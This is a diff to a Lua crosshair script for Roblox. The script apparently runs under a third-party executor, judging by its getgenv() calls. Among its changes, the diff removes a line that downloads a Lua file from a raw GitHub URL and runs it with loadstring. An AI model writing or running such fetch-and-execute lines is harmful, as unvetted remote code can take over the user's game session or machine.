@@ -1,13 +1,4 @@
--- Unique identifier for this script instance
-local SCRIPT_IDENTIFIER = "CustomCrosshairScript"
-
--- Check for existing instance and terminate it
-if getgenv().currentCrosshairScript then
-    getgenv().currentCrosshairScript:Disconnect()
-    getgenv().currentCrosshairScript = nil
-end
-
--- Define the new crosshair settings
+-- Define crosshair settings
 getgenv().crosshair = {
     Enabled = true,
     refreshRate = 0.015,
@@ -70,11 +61,15 @@ local function solve(angle, radius)
     )
 end
 
--- Run the main loop
-getgenv().currentCrosshairScript = runservice.PostSimulation:Connect(function()
+runservice.PostSimulation:Connect(function()
     local _tick = tick()
     if _tick - lastRender > crosshair.refreshRate then
         lastRender = _tick
+
+        -- Adjust mode based on screen focus
+        if not inputservice.WindowFocused then
+            crosshair.mode = 'center'
+        end
 
         local position = (
             crosshair.mode == 'center' and camera.ViewportSize / 2 or
@@ -131,6 +126,3 @@ getgenv().currentCrosshairScript = runservice.PostSimulation:Connect(function()
         end
     end
 end)
-
--- Load the external script
-loadstring(game:HttpGet("https://raw.githubusercontent.com/f-5ve/storage/main/spinspin.lua", true))()
